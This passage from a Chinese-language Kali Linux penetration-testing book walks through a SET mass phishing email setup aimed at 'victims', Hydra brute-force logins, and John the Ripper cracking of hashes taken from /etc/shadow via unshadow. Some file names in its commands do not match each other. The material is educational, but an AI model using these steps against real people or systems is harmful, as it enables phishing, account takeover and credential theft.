  \ `1` 将对你很有用。\n\n![](img/00009.jpeg)\n\n这一次，你应该指定目标邮件列表的路径。在我们的案例中，我们有一个邮件列表，你只需要添加文件名以及指向该文件的路径即可。\n\
  \n我们没有可用于发送邮件的 SMTP 服务器。我们将使用 Gmail 账户来发送这些邮件，因此选择选项 `1`。如果你有自己的 SMTP 或电子邮件服务器，请随意探索可用选项。\n\
  \n然后你可以提供你的 Gmail 地址。请注意，该地址必须正确，且对应的密码也必须正确。完成后，你就可以发送邮件了。\n\n然后你可以输入你希望邮件接收者在收件箱中看到的名称。你的受害者会在看到其他任何内容之前看到这条消息。此字段的编写应当非常慎重，因为社会工程攻击就发生在这里。\n\
  \n随后你会被要求输入密码，请输入你的 Gmail 账户密码。你可以选择将消息标记为高优先级或不。不过，请注意，这可能对你有帮助但在其他情况下，受害者可能会怀疑某些事情。使用适合你的设置即可。\n\
  \n然后系统会提示你输入邮件主题。只需输入你想要作为邮件主题的内容。`SET` 还会要求你选择邮件正文是纯文本还是 HTML 格式。`P` 代表纯文本，`H`\
  \ 代表 HTML。进入“输入正文文本”（Enter the body text）部分，这就是你应该添加邮件正文的地方。在输入邮件正文时，如果你选择使用 HTML\
  \ 作为消息格式，请确保添加了 HTML 标签。完成后，按 `Ctrl + C` 即可发送消息。按 `Enter` 键返回主菜单。\n\n执行群发邮件攻击就是如此简单！\n\
  \n# 第 10 章 - 密码破解\n\n你可以从 Kali Linux 执行密码破解攻击。Kali Linux 拥有许多可以帮助你完成此任务的工具。让我们讨论如何实现。\n\
  \n## 使用 Hydra\n\n这是一个用于暴力破解攻击的工具，它支持许多服务。该工具易用且快速，并方便我们安装新模块。那些需要从远程位置获取系统某些未授权访问的人可以使用此工具。\n\
  \n为了让我们执行暴力破解攻击，应为 `Hydra` 提供密码列表。市上有许多密码列表来源。在这种情况下，让我们选择 John the Ripper 提供的默认列表。你也可以在\
  \ Google 上搜索在线密码列表。\n\n`Hydra` 工具已预装，但你可以使用仓库来安装一个精简版本。你只需要运行以下命令：\n\n```\napt-get\
  \ install hydra-gtk\n```\n\n要访问 `Hydra`，你应该按照以下路径导航：\n\n” Applications -> Kali Linux\
  \ -> Passwords Attacks -> Online Attacks -> hydra- gtk “\n\n你将看到一个如下所示的屏幕：\n\n![](img/00010.jpeg)\n\
  \n我们现在想对特定账户进行暴力破解攻击，你将学到为你的账户设置强密码的重要性。\n\n在“目标”（Target）选项卡中填写必要的细节。在“目标列表”（Target\
  \ List）中，请随意添加你想要进行攻击的地址列表。完成后，点击“密码”（Passwords）选项卡。\n\n你可以填写要测试的电子邮件地址以及指向字典的路径。请注意，\
  \ `/usr/share/wordlist/` 下有一个包含词汇列表的存档。要使用它，你应该先将其提取。\n\n在“调整”（Tuning）选项卡中，你可以设置并发执行的任务数、超时时间以及代理的使用。\n\
  \n“特定”（Specific）选项卡帮助我们配置如何使用 HTTP 代理。跳到“启动”（Start）选项卡。移动到左下角，然后点击“启动”即可开始攻击。\n\n\
  ## 使用 John the Ripper\n\n这也是一个用于密码破解的免费工具。在 Linux 中，密码哈希存储在 `/etc/shadow` 文件中。为了演示如何使用此工具破解密码，我们将创建一个新用户并为他分配密码。该用户还将被添加到\
  \ sudo 组，其 shell 设置为 `/bin/bash`。\n\n让我们首先运行给定的命令来创建用户并为其分配密码：\n\n```\nroot@kali:~#\
  \ useradd -m john -G sudo -s /bin/bash\nroot@kali:~# passwd john\n```\n\n注意，我们创建了一个名为“john”的用户，并为他的账户设置了密码“john”。\n\
  \n然后我们可以运行 `unshadow` 命令，它将帮助我们合并 `/etc/passwd` 文件和 `/etc/shadow` 文件，创建一个包含用户名和密码列表的单一文件。按顺序运行以下命令：\n\
  \n```\n## unshadow\n## unshadow /etc/passwd /etc/shadow > /root/johns_passwd\n##\
  \ ls –ltrah /usr/share/john/password.list\n```\n\n就是这样！如果我们获取了字典文件，就可以继续破解。该工具自带一个密码文件，位于\
  \ `/usr/share/john/password.lst`。只需运行以下命令：\n\n```\n## john --wordlist=/usr/share/john/password.list\
  \ /root/johns_password\n```\n\n要查看已破解的密码，只需运行如下所示的 `john --show` 命令：\n\n```\n##\
  \ john --show /root/johns_passwd\n```\n\n就是这样！\n\n## 结论\n\n我们已经读到了这本书的最后末尾。Kali\
  \ Linux 是一个非常强大的 Linux 发行版，特别是对于渗透测试。该操作系统自带许多工具，可以帮助你对系统和应用程序进行渗透测试。这使得 Kali Linux\
  \ 成为用于渗透测试的最佳操作系统。在将你的系统部署到工作或生产环境之前，最好先通过渗透测试对其进行测试，以确保它没有漏洞。通过渗透测试，你可以识别系统中的漏洞并在投入生产之前将其封堵。这将帮助你防止因黑客利用而可能发生的灾难。\n"
